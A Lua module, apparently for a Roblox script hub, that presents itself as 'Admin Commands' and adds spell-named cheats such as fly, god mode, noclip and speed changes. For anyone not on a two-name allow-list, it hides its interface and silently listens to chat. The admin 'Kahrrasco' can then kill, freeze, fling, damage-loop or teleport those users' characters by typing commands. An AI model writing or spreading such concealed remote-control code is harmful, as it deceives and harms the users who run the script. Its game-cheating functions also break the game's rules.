print('[KAH][LOAD] Comandos De Admin.lua')
-- ============================================
-- MODULE: ADMIN COMMANDS
-- Spells via chat - executam no cliente local
-- de quem estiver rodando o script.
-- So aceita comandos de admins da lista ADMINS.
-- ============================================
local VERSION     = "1.0.0"
local CATEGORIA   = "Utility"
local MODULE_NAME = "Admin Commands"
local MODULE_STATE_KEY = "__kah_admin_commands_state"

if not _G.Hub and not _G.HubFila then
    print("[KAH][WARN][AdminCommands] hub nao encontrado, abortando")
    return
end

do
    local old = _G[MODULE_STATE_KEY]
    if old then
        if old.cleanup then pcall(old.cleanup) end
        if old.gui and old.gui.Parent then
            pcall(function() old.gui:Destroy() end)
        end
    end
    _G[MODULE_STATE_KEY] = nil
end

local Players         = game:GetService("Players")
local UIS             = game:GetService("UserInputService")
local TS              = game:GetService("TweenService")
local RS              = game:GetService("RunService")
local TextChatService = game:GetService("TextChatService")
local player          = Players.LocalPlayer

local function canShowAdminUi()
    local allowed = {
        kahrrasco = true,
        vava_filha = true,
    }
    local name = string.lower(tostring(player.Name or ""))
    local display = string.lower(tostring(player.DisplayName or ""))
    return allowed[name] == true or allowed[display] == true
end

local SHOW_ADMIN_UI = canShowAdminUi()

-- ============================================
-- ADMINS
-- ============================================
local ADMINS = {
    "Kahrrasco",
}

-- Se false, comandos NAO afetam o cliente do proprio admin
local EXECUTAR_EM_MIM = false

local function isAdmin(nome)
    for _, n in ipairs(ADMINS) do
        if n == nome then return true end
    end
    return false
end

-- ============================================
-- HELPERS
-- ============================================
local function getHRP()
    local c = player.Character
    return c and (c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso"))
end

local function getHum()
    local c = player.Character
    return c and c:FindFirstChildOfClass("Humanoid")
end

local function getPlayerByName(nome)
    local nomeLower = nome:lower()
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower():find(nomeLower, 1, true)
        or p.DisplayName:lower():find(nomeLower, 1, true) then
            return p
        end
    end
    return nil
end

-- ============================================
-- ESTADO DOS EFEITOS ATIVOS
-- ============================================
local flyAtivo     = false
local flyConn      = nil
local flyBV        = nil

local godAtivo     = false
local godConn      = nil

local noclipAtivo  = false
local noclipConn   = nil

local crucioAtivo  = false
local crucioThread = nil

local impedAtivo   = false

-- ============================================
-- IMPLEMENTACOES
-- ============================================

-- AVADA KEDAVRA - mata o personagem local
local function avada()
    local hum = getHum()
    if hum then hum.Health = 0 end
end

-- ACCIO - teleporta ate Kahrrasco
local function accio()
    local alvo = getPlayerByName("Kahrrasco")
    if not alvo then
        -- se o proprio Kahrrasco rodou o script, pega o primeiro admin online
        for _, p in ipairs(Players:GetPlayers()) do
            if isAdmin(p.Name) then alvo = p; break end
        end
    end
    if not alvo then return end
    local hrpAlvo = alvo.Character and (alvo.Character:FindFirstChild("HumanoidRootPart") or alvo.Character:FindFirstChild("Torso"))
    local hrp = getHRP()
    if hrp and hrpAlvo then
        hrp.CFrame = hrpAlvo.CFrame * CFrame.new(0, 0, 3)
    end
end

-- APPARATE - teleporta ate jogador pelo nome
local function apparate(nome)
    if not nome or nome == "" then return end
    local alvo = getPlayerByName(nome)
    if not alvo then return end
    local hrpAlvo = alvo.Character and (alvo.Character:FindFirstChild("HumanoidRootPart") or alvo.Character:FindFirstChild("Torso"))
    local hrp = getHRP()
    if hrp and hrpAlvo then
        hrp.CFrame = hrpAlvo.CFrame * CFrame.new(0, 0, 3)
    end
end

-- EXPELLIARMUS - lanca o personagem para longe
local function expelliarmus()
    local hrp = getHRP()
    if not hrp then return end
    local direcao = hrp.CFrame.LookVector
    -- aplica impulso via VectorForce temporario
    local att = Instance.new("Attachment", hrp)
    local vf  = Instance.new("VectorForce")
    vf.Attachment0 = att
    vf.Force       = direcao * 120000
    vf.Parent      = hrp
    task.delay(0.08, function()
        vf:Destroy()
        att:Destroy()
    end)
end

-- WINGARDIUM LEVIOSA - voo
local function wingardium()
    if flyAtivo then return end
    flyAtivo = true
    local hrp = getHRP()
    if not hrp then return end

    -- BV para controle de altitude
    local att = Instance.new("Attachment", hrp)
    flyBV = Instance.new("BodyVelocity")
    flyBV.MaxForce  = Vector3.new(0, math.huge, 0)
    flyBV.Velocity  = Vector3.new(0, 0, 0)
    flyBV.Parent    = hrp

    local hum = getHum()
    if hum then hum.PlatformStand = true end

    flyConn = RS.Heartbeat:Connect(function()
        local c = player.Character
        if not c then return end
        local h = c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso")
        if not h then return end

        local up   = UIS:IsKeyDown(Enum.KeyCode.Space)
        local down = UIS:IsKeyDown(Enum.KeyCode.LeftControl)
            or UIS:IsKeyDown(Enum.KeyCode.C)

        local vy = flyBV.Velocity.Y
        if up then
            flyBV.Velocity = Vector3.new(0, math.min(vy + 2, 60), 0)
        elseif down then
            flyBV.Velocity = Vector3.new(0, math.max(vy - 2, -60), 0)
        else
            flyBV.Velocity = Vector3.new(0, vy * 0.85, 0)
        end
    end)
end

-- NOX - desativa voo
local function nox()
    flyAtivo = false
    if flyConn then flyConn:Disconnect(); flyConn = nil end
    if flyBV   then flyBV:Destroy();      flyBV   = nil end
    local hum = getHum()
    if hum then hum.PlatformStand = false end
end

-- PROTEGO - god mode
local function protego()
    if godAtivo then return end
    godAtivo = true
    godConn  = RS.Heartbeat:Connect(function()
        local hum = getHum()
        if hum then hum.Health = hum.MaxHealth end
    end)
end

-- FINITE - cancela god mode
local function finite()
    godAtivo = false
    if godConn then godConn:Disconnect(); godConn = nil end
end

-- ALOHOMORA - noclip
local function alohomora()
    if noclipAtivo then return end
    noclipAtivo = true
    noclipConn  = RS.Stepped:Connect(function()
        local c = player.Character
        if not c then return end
        for _, p in ipairs(c:GetDescendants()) do
            if p:IsA("BasePart") then
                p.CanCollide = false
            end
        end
    end)
end

-- COLLOPORTUS - desativa noclip
local function colloportus()
    noclipAtivo = false
    if noclipConn then noclipConn:Disconnect(); noclipConn = nil end
    local c = player.Character
    if not c then return end
    for _, p in ipairs(c:GetDescendants()) do
        if p:IsA("BasePart") then
            p.CanCollide = true
        end
    end
end

-- IMPEDIMENTA - trava o personagem no lugar
local function impedimenta()
    impedAtivo = true
    local hum = getHum()
    if hum then
        hum.WalkSpeed  = 0
        hum.JumpPower  = 0
    end
end

-- LIBERACORPUS - libera tudo
local function liberacorpus()
    -- cancela todos os efeitos ativos
    nox()
    finite()
    colloportus()

    if crucioAtivo then
        crucioAtivo = false
        if crucioThread then task.cancel(crucioThread); crucioThread = nil end
    end

    impedAtivo = false
    local hum = getHum()
    if hum then
        hum.WalkSpeed = 16
        hum.JumpPower = 50
    end
end

-- CRUCIO - loop de dano
local function crucio()
    if crucioAtivo then return end
    crucioAtivo  = true
    crucioThread = task.spawn(function()
        while crucioAtivo do
            local hum = getHum()
            if hum and hum.Health > 0 then
                hum.Health = math.max(0, hum.Health - 5)
            end
            task.wait(0.3)
        end
    end)
end

-- ============================================
-- TABELA DE COMANDOS (sem ! na frente)
-- ============================================
local COMANDOS = {
    {
        trigger = "avada",
        action  = function(msg)
            avada()
        end,
    },
    {
        trigger = "accio",
        action  = function(msg)
            accio()
        end,
    },
    {
        trigger = "apparate",
        action  = function(msg)
            -- "apparate Dieisson"
            local alvo = msg:match("apparate%s+(%S+)")
            apparate(alvo or "")
        end,
    },
    {
        trigger = "expelliarmus",
        action  = function(msg)
            expelliarmus()
        end,
    },
    {
        trigger = "wingardium",
        action  = function(msg)
            wingardium()
        end,
    },
    {
        trigger = "nox",
        action  = function(msg)
            nox()
        end,
    },
    {
        trigger = "protego",
        action  = function(msg)
            protego()
        end,
    },
    {
        trigger = "finite",
        action  = function(msg)
            finite()
        end,
    },
    {
        trigger = "alohomora",
        action  = function(msg)
            alohomora()
        end,
    },
    {
        trigger = "colloportus",
        action  = function(msg)
            colloportus()
        end,
    },
    {
        trigger = "impedimenta",
        action  = function(msg)
            impedimenta()
        end,
    },
    {
        trigger = "liberacorpus",
        action  = function(msg)
            liberacorpus()
        end,
    },
    {
        trigger = "crucio",
        action  = function(msg)
            crucio()
        end,
    },
}

-- ============================================
-- PROCESSAR MENSAGEM
-- So executa se vier de um admin
-- ============================================
local monitorAtivo = false

local function processarMensagem(remetente, mensagem)
    if not monitorAtivo then return end
    if not isAdmin(remetente) then return end  -- ignora quem nao e admin

    local msgLower = mensagem:lower():match("^%s*(.-)%s*$")  -- trim

    for _, cmd in ipairs(COMANDOS) do
        local t = cmd.trigger:lower()
        -- aceita exatamente a spell ou spell + espaco + argumento
        if msgLower == t or msgLower:sub(1, #t + 1) == t .. " " then
            local ok, err = pcall(cmd.action, msgLower)
            if not ok then
                warn(">>> AdminCommands [" .. cmd.trigger .. "]: " .. tostring(err))
            end
            return  -- so executa o primeiro match
        end
    end
end

-- ============================================
-- CONECTAR AO CHAT
-- ============================================
local chatConns = {}

local function desconectarChat()
    for _, c in ipairs(chatConns) do pcall(function() c:Disconnect() end) end
    chatConns = {}
end

local function conectarChat()
    desconectarChat()

    -- FONTE 1: TextChatService (sistema novo)
    pcall(function()
        local function conectarCanal(ch)
            if not ch:IsA("TextChannel") then return end
            local conn = ch.MessageReceived:Connect(function(msg)
                local origem = msg.TextSource
                local p      = origem and Players:GetPlayerByUserId(origem.UserId)
                local nome   = p and p.Name or (origem and tostring(origem.Name) or "?")
                processarMensagem(nome, msg.Text or "")
            end)
            table.insert(chatConns, conn)
        end
        for _, ch in ipairs(TextChatService:GetDescendants()) do
            conectarCanal(ch)
        end
        local conn = TextChatService.DescendantAdded:Connect(function(d)
            task.wait(0.1); conectarCanal(d)
        end)
        table.insert(chatConns, conn)
    end)

    -- FONTE 2: Chatted de todos os jogadores (legado)
    local function conectarChatted(p)
        local conn = p.Chatted:Connect(function(msg)
            processarMensagem(p.Name, msg)
        end)
        table.insert(chatConns, conn)
    end

    for _, p in ipairs(Players:GetPlayers()) do
        conectarChatted(p)
    end
    local conn = Players.PlayerAdded:Connect(function(p)
        task.wait(0.5); conectarChatted(p)
    end)
    table.insert(chatConns, conn)
end

-- ============================================
-- CORES
-- ============================================
local C = {
    bg        = Color3.fromRGB(10, 11, 15),
    header    = Color3.fromRGB(12, 14, 20),
    border    = Color3.fromRGB(28, 32, 48),
    accent    = Color3.fromRGB(180, 100, 255),
    accentDim = Color3.fromRGB(35, 15, 65),
    green     = Color3.fromRGB(50, 220, 100),
    greenDim  = Color3.fromRGB(15, 55, 25),
    red       = Color3.fromRGB(220, 50, 70),
    redDim    = Color3.fromRGB(55, 12, 18),
    text      = Color3.fromRGB(180, 190, 210),
    muted     = Color3.fromRGB(80, 92, 118),
    rowBg     = Color3.fromRGB(15, 17, 24),
}

-- ============================================
-- GUI
-- ============================================
local W        = 250
local H_HDR    = 34
local H_STATUS = 20
local H_TOGGLE = 34
local H_LOG    = 160
local PAD      = 6
local H_FULL   = H_HDR + H_STATUS + H_TOGGLE + PAD * 2 + H_LOG + PAD

local function getMinimizedWidth()
    if _G.KAHUiDefaults and _G.KAHUiDefaults.getMinWidth then
        local ok, v = pcall(_G.KAHUiDefaults.getMinWidth)
        if ok and tonumber(v) then return math.clamp(math.floor(tonumber(v)), 220, 420) end
    end
    return 240
end

local pg  = player:WaitForChild("PlayerGui")
local ant = pg:FindFirstChild("AdminCommands_hud")
if ant then ant:Destroy() end

local gui = Instance.new("ScreenGui")
gui.Name           = "AdminCommands_hud"
gui.ResetOnSpawn   = false
gui.IgnoreGuiInset = true
gui.Parent         = pg
gui.Enabled        = SHOW_ADMIN_UI

local frame = Instance.new("Frame")
frame.Name             = "AdminFrame"
frame.Size             = UDim2.new(0, W, 0, H_FULL)
frame.Position         = UDim2.new(0, 20, 0, 120)
frame.BackgroundColor3 = C.bg
frame.BorderSizePixel  = 0
frame.Parent           = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 4)
Instance.new("UIStroke", frame).Color        = C.border

-- Linha accent topo
local topLine = Instance.new("Frame")
topLine.Size             = UDim2.new(1, 0, 0, 2)
topLine.BackgroundColor3 = C.accent
topLine.BorderSizePixel  = 0
topLine.ZIndex           = 5
topLine.Parent           = frame
Instance.new("UICorner", topLine).CornerRadius = UDim.new(0, 4)

-- Header
local header = Instance.new("Frame")
header.Size             = UDim2.new(1, 0, 0, H_HDR)
header.BackgroundColor3 = C.header
header.BorderSizePixel  = 0
header.Active           = true
header.ZIndex           = 3
header.Parent           = frame
Instance.new("UICorner", header).CornerRadius = UDim.new(0, 4)

local titleLbl = Instance.new("TextLabel")
titleLbl.Size               = UDim2.new(1, -80, 1, 0)
titleLbl.Position           = UDim2.new(0, 10, 0, 0)
titleLbl.Text               = "ADMIN COMMANDS"
titleLbl.TextColor3         = C.accent
titleLbl.Font               = Enum.Font.GothamBold
titleLbl.TextSize           = 11
titleLbl.BackgroundTransparency = 1
titleLbl.TextXAlignment     = Enum.TextXAlignment.Left
titleLbl.ZIndex             = 4
titleLbl.Parent             = header

local minBtn = Instance.new("TextButton")
minBtn.Size             = UDim2.new(0, 20, 0, 20)
minBtn.Position         = UDim2.new(1, -44, 0.5, -10)
minBtn.Text             = "-"
minBtn.BackgroundColor3 = Color3.fromRGB(25, 28, 38)
minBtn.TextColor3       = C.muted
minBtn.Font             = Enum.Font.GothamBold
minBtn.TextSize         = 10
minBtn.BorderSizePixel  = 0
minBtn.ZIndex           = 4
minBtn.Parent           = header
Instance.new("UIStroke", minBtn).Color        = C.border
Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0, 3)

local closeBtn = Instance.new("TextButton")
closeBtn.Size             = UDim2.new(0, 20, 0, 20)
closeBtn.Position         = UDim2.new(1, -20, 0.5, -10)
closeBtn.Text             = "x"
closeBtn.BackgroundColor3 = C.redDim
closeBtn.TextColor3       = C.red
closeBtn.Font             = Enum.Font.GothamBold
closeBtn.TextSize         = 10
closeBtn.BorderSizePixel  = 0
closeBtn.ZIndex           = 4
closeBtn.Parent           = header
Instance.new("UIStroke", closeBtn).Color        = Color3.fromRGB(100, 20, 35)
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 3)

-- Status
local statusBar = Instance.new("Frame")
statusBar.Size             = UDim2.new(1, 0, 0, H_STATUS)
statusBar.Position         = UDim2.new(0, 0, 0, H_HDR)
statusBar.BackgroundColor3 = Color3.fromRGB(8, 10, 16)
statusBar.BorderSizePixel  = 0
statusBar.ZIndex           = 2
statusBar.Parent           = frame

local statusLbl = Instance.new("TextLabel")
statusLbl.Size               = UDim2.new(1, -16, 1, 0)
statusLbl.Position           = UDim2.new(0, 8, 0, 0)
statusLbl.Text               = "// AGUARDANDO ATIVACAO"
statusLbl.TextColor3         = C.muted
statusLbl.Font               = Enum.Font.Code
statusLbl.TextSize           = 9
statusLbl.BackgroundTransparency = 1
statusLbl.TextXAlignment     = Enum.TextXAlignment.Left
statusLbl.ZIndex             = 3
statusLbl.Parent             = statusBar

-- Toggle ON/OFF
local Y_TOGGLE = H_HDR + H_STATUS + PAD

local toggleFrame = Instance.new("Frame")
toggleFrame.Size             = UDim2.new(1, -PAD * 2, 0, H_TOGGLE)
toggleFrame.Position         = UDim2.new(0, PAD, 0, Y_TOGGLE)
toggleFrame.BackgroundColor3 = C.rowBg
toggleFrame.BorderSizePixel  = 0
toggleFrame.ZIndex           = 3
toggleFrame.Parent           = frame
Instance.new("UICorner", toggleFrame).CornerRadius = UDim.new(0, 4)
local tgStroke = Instance.new("UIStroke", toggleFrame)
tgStroke.Color = C.border

local tgBar = Instance.new("Frame")
tgBar.Size             = UDim2.new(0, 2, 1, -6)
tgBar.Position         = UDim2.new(0, 0, 0, 3)
tgBar.BackgroundColor3 = C.border
tgBar.BorderSizePixel  = 0
tgBar.ZIndex           = 4
tgBar.Parent           = toggleFrame
Instance.new("UICorner", tgBar).CornerRadius = UDim.new(0, 2)

local tgLbl = Instance.new("TextLabel")
tgLbl.Size               = UDim2.new(1, -60, 1, 0)
tgLbl.Position           = UDim2.new(0, 12, 0, 0)
tgLbl.Text               = "Admin Commands"
tgLbl.TextColor3         = C.text
tgLbl.Font               = Enum.Font.GothamBold
tgLbl.TextSize           = 11
tgLbl.BackgroundTransparency = 1
tgLbl.TextXAlignment     = Enum.TextXAlignment.Left
tgLbl.ZIndex             = 4
tgLbl.Parent             = toggleFrame

local track = Instance.new("Frame")
track.Size             = UDim2.new(0, 34, 0, 16)
track.Position         = UDim2.new(1, -44, 0.5, -8)
track.BackgroundColor3 = Color3.fromRGB(25, 28, 40)
track.BorderSizePixel  = 0
track.ZIndex           = 5
track.Parent           = toggleFrame
Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)
local trackStroke = Instance.new("UIStroke", track)
trackStroke.Color = C.border

local knob = Instance.new("Frame")
knob.Size             = UDim2.new(0, 12, 0, 12)
knob.Position         = UDim2.new(0, 2, 0.5, -6)
knob.BackgroundColor3 = C.muted
knob.BorderSizePixel  = 0
knob.ZIndex           = 6
knob.Parent           = track
Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)

-- Log de spells executadas
local Y_LOG = Y_TOGGLE + H_TOGGLE + PAD

local logScroll = Instance.new("ScrollingFrame")
logScroll.Size                 = UDim2.new(1, -PAD * 2, 0, H_LOG)
logScroll.Position             = UDim2.new(0, PAD, 0, Y_LOG)
logScroll.BackgroundColor3     = Color3.fromRGB(8, 9, 13)
logScroll.BorderSizePixel      = 0
logScroll.ScrollBarThickness   = 3
logScroll.ScrollBarImageColor3 = C.accent
logScroll.CanvasSize           = UDim2.new(0, 0, 0, 0)
logScroll.AutomaticCanvasSize  = Enum.AutomaticSize.Y
logScroll.ZIndex               = 3
logScroll.Parent               = frame
Instance.new("UICorner", logScroll).CornerRadius = UDim.new(0, 4)
Instance.new("UIStroke", logScroll).Color        = C.border

local logLayout = Instance.new("UIListLayout", logScroll)
logLayout.Padding   = UDim.new(0, 1)
logLayout.SortOrder = Enum.SortOrder.LayoutOrder

local logPad = Instance.new("UIPadding", logScroll)
logPad.PaddingLeft   = UDim.new(0, 4)
logPad.PaddingTop    = UDim.new(0, 3)
logPad.PaddingBottom = UDim.new(0, 3)

local logCount = 0
local function addLog(texto, cor)
    logCount += 1
    local lbl = Instance.new("TextLabel")
    lbl.Size               = UDim2.new(1, -4, 0, 13)
    lbl.BackgroundTransparency = 1
    lbl.Text               = texto
    lbl.TextColor3         = cor or C.text
    lbl.Font               = Enum.Font.Code
    lbl.TextSize           = 9
    lbl.TextXAlignment     = Enum.TextXAlignment.Left
    lbl.TextTruncate       = Enum.TextTruncate.AtEnd
    lbl.LayoutOrder        = logCount
    lbl.ZIndex             = 4
    lbl.Parent             = logScroll
    task.defer(function()
        local maxY = logScroll.AbsoluteCanvasSize.Y - logScroll.AbsoluteSize.Y
        local curY = logScroll.CanvasPosition.Y
        if maxY <= 0 or (maxY - curY) < 60 then
            logScroll.CanvasPosition = Vector2.new(0, math.huge)
        end
    end)
end

-- ============================================
-- TOGGLE VISUAL
-- ============================================
local function setVisual(ativo)
    if ativo then
        TS:Create(knob,        TweenInfo.new(0.15), { Position = UDim2.new(1, -14, 0.5, -6), BackgroundColor3 = C.accent }):Play()
        TS:Create(track,       TweenInfo.new(0.15), { BackgroundColor3 = C.accentDim }):Play()
        TS:Create(tgBar,       TweenInfo.new(0.15), { BackgroundColor3 = C.accent }):Play()
        TS:Create(toggleFrame, TweenInfo.new(0.15), { BackgroundColor3 = Color3.fromRGB(22, 12, 40) }):Play()
        TS:Create(tgLbl,       TweenInfo.new(0.15), { TextColor3 = C.accent }):Play()
        trackStroke.Color    = Color3.fromRGB(100, 50, 180)
        tgStroke.Color       = C.accent
        statusLbl.Text       = "// ATIVO - escutando " .. #ADMINS .. " admin(s)"
        statusLbl.TextColor3 = C.accent
    else
        TS:Create(knob,        TweenInfo.new(0.15), { Position = UDim2.new(0, 2, 0.5, -6), BackgroundColor3 = C.muted }):Play()
        TS:Create(track,       TweenInfo.new(0.15), { BackgroundColor3 = Color3.fromRGB(25, 28, 40) }):Play()
        TS:Create(tgBar,       TweenInfo.new(0.15), { BackgroundColor3 = C.border }):Play()
        TS:Create(toggleFrame, TweenInfo.new(0.15), { BackgroundColor3 = C.rowBg }):Play()
        TS:Create(tgLbl,       TweenInfo.new(0.15), { TextColor3 = C.text }):Play()
        trackStroke.Color    = C.border
        tgStroke.Color       = C.border
        statusLbl.Text       = "// AGUARDANDO ATIVACAO"
        statusLbl.TextColor3 = C.muted
    end
end

-- Wrap processarMensagem para logar na UI
local _processar = processarMensagem

local function activateMonitor(logText, logColor)
    if monitorAtivo then return end
    monitorAtivo = true
    setVisual(true)
    conectarChat()
    if logText then
        addLog(logText, logColor or C.green)
    end
end

local function deactivateMonitor(logText, logColor)
    if monitorAtivo then
        desconectarChat()
        monitorAtivo = false
    end
    liberacorpus()
    setVisual(false)
    if logText then
        addLog(logText, logColor or C.muted)
    end
end

processarMensagem = function(remetente, mensagem)
    if not monitorAtivo then return end
    if not isAdmin(remetente) then return end
    if not EXECUTAR_EM_MIM and player.Name == remetente then return end
    local msgLower = mensagem:lower():match("^%s*(.-)%s*$")
    if msgLower == "adminoff" then
        if remetente == "Kahrrasco" then
            deactivateMonitor("[REMOTE OFF] monitor desligado por Kahrrasco", C.red)
        end
        return
    end
    for _, cmd in ipairs(COMANDOS) do
        local t = cmd.trigger:lower()
        if msgLower == t or msgLower:sub(1, #t + 1) == t .. " " then
            addLog("[CMD] " .. remetente .. ": " .. mensagem, C.accent)
            local ok, err = pcall(cmd.action, msgLower)
            if not ok then
                addLog("  erro: " .. tostring(err), C.red)
                warn("[KAH][WARN][AdminCommands][" .. cmd.trigger .. "] " .. tostring(err))
            end
            return
        end
    end
end

local function toggleMonitor()
    if monitorAtivo then
        deactivateMonitor("[OFF] Efeitos cancelados", C.muted)
    else
        activateMonitor("[ON] Admin Commands ativado", C.green)
    end
end

local toggleBtn = Instance.new("TextButton")
toggleBtn.Size               = UDim2.new(1, 0, 1, 0)
toggleBtn.BackgroundTransparency = 1
toggleBtn.Text               = ""
toggleBtn.ZIndex             = 7
toggleBtn.Parent             = toggleFrame
toggleBtn.MouseButton1Click:Connect(toggleMonitor)

-- ============================================
-- MINIMIZAR / FECHAR
-- ============================================
local minimizado = false
local hCache     = H_FULL

local function setMinimizado(v)
    minimizado = v
    if minimizado then
        hCache = frame.Size.Y.Offset
        frame.Size         = UDim2.new(0, getMinimizedWidth(), 0, H_HDR)
        statusBar.Visible  = false
        toggleFrame.Visible = false
        logScroll.Visible  = false
        minBtn.Text        = "A"
    else
        statusBar.Visible   = true
        toggleFrame.Visible = true
        logScroll.Visible   = true
        TS:Create(frame, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {
            Size = UDim2.new(0, W, 0, hCache)
        }):Play()
        minBtn.Text = "-"
    end
end

minBtn.MouseButton1Click:Connect(function() setMinimizado(not minimizado) end)
closeBtn.MouseButton1Click:Connect(function()
    if monitorAtivo then desconectarChat(); monitorAtivo = false end
    liberacorpus()
    gui.Enabled = false
    if _G.Hub then pcall(function() _G.Hub.desligar(MODULE_NAME) end) end
end)

-- ============================================
-- DRAG
-- ============================================
local dragging, dragStart, startPos
header.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1
    or i.UserInputType == Enum.UserInputType.Touch then
        dragging = true; dragStart = i.Position; startPos = frame.Position
    end
end)
UIS.InputChanged:Connect(function(i)
    if not dragging then return end
    if i.UserInputType ~= Enum.UserInputType.MouseMovement
    and i.UserInputType ~= Enum.UserInputType.Touch then return end
    local d  = i.Position - dragStart
    local vp = workspace.CurrentCamera.ViewportSize
    local nx = math.clamp(startPos.X.Offset + d.X, 4, vp.X - frame.Size.X.Offset - 4)
    local ny = math.clamp(startPos.Y.Offset + d.Y, 4, vp.Y - frame.Size.Y.Offset - 4)
    if _G.Snap then _G.Snap.mover(frame, nx, ny)
    else frame.Position = UDim2.new(0, nx, 0, ny) end
end)
UIS.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1
    or i.UserInputType == Enum.UserInputType.Touch then
        if _G.Snap then _G.Snap.soltar(frame) end
        dragging = false
    end
end)

if _G.Snap then
    _G.Snap.registrar(frame, function() end, function(_, mode)
        setMinimizado(mode == "minimize")
    end)
end

-- ============================================
-- REGISTRA NO HUB
-- ============================================
local function onToggle(ativo)
    if ativo then
        activateMonitor("[AUTO] Admin Commands ativado", C.green)
    else
        deactivateMonitor("[OFF] Efeitos cancelados", C.muted)
    end
    if gui and gui.Parent then gui.Enabled = ativo end
end

-- Helper para sincronizar estado do hub com efeito local
local function hubToggle(nome, ligarFn, desligarFn)
    return function(ativo)
        if ativo then ligarFn() else desligarFn() end
    end
end

local function registrarNoHub(nome, fn, cat, ativo, opts)
    if _G.Hub then
        _G.Hub.registrar(nome, fn, cat, ativo, opts)
    else
        _G.HubFila = _G.HubFila or {}
        table.insert(_G.HubFila, { nome = nome, toggleFn = fn, categoria = cat, jaAtivo = ativo, opts = opts })
    end
end

local speedValue = 16
local jumpValue = 50

if SHOW_ADMIN_UI then
    registrarNoHub(MODULE_NAME, onToggle, CATEGORIA, true)

    registrarNoHub("Wingardium / Nox", hubToggle("fly",
        function() wingardium() end,
        function() nox() end
    ), CATEGORIA, false)

    registrarNoHub("Protego / Finite", hubToggle("god",
        function() protego() end,
        function() finite() end
    ), CATEGORIA, false)

    registrarNoHub("Alohomora / Colloportus", hubToggle("noclip",
        function() alohomora() end,
        function() colloportus() end
    ), CATEGORIA, false)

    registrarNoHub("Crucio", hubToggle("crucio",
        function() crucio() end,
        function()
            crucioAtivo = false
            if crucioThread then task.cancel(crucioThread); crucioThread = nil end
        end
    ), CATEGORIA, false)

    registrarNoHub("Speed", function(ativo)
        local hum = getHum()
        if hum then hum.WalkSpeed = ativo and speedValue or 16 end
    end, CATEGORIA, false, {
        inlineNumber = {
            get = function() return speedValue end,
            set = function(v)
                speedValue = math.clamp(math.floor(v), 0, 500)
                local hum = getHum()
                if hum and hum.WalkSpeed ~= 16 then hum.WalkSpeed = speedValue end
            end,
            min = 0, max = 500,
        }
    })

    registrarNoHub("Jump Power", function(ativo)
        local hum = getHum()
        if hum then hum.JumpPower = ativo and jumpValue or 50 end
    end, CATEGORIA, false, {
        inlineNumber = {
            get = function() return jumpValue end,
            set = function(v)
                jumpValue = math.clamp(math.floor(v), 0, 1000)
                local hum = getHum()
                if hum and hum.JumpPower ~= 50 then hum.JumpPower = jumpValue end
            end,
            min = 0, max = 1000,
        }
    })
else
    activateMonitor(nil, nil)
end

addLog("[INIT] " .. #COMANDOS .. " spells carregadas", C.accent)
addLog("[ADM] " .. table.concat(ADMINS, ", "), C.muted)
print("[KAH][LOAD] ADMIN COMMANDS v" .. VERSION .. " ativo")

_G[MODULE_STATE_KEY] = {
    gui = gui,
    cleanup = function()
        if monitorAtivo then
            desconectarChat()
            monitorAtivo = false
        end
        liberacorpus()
    end,
}

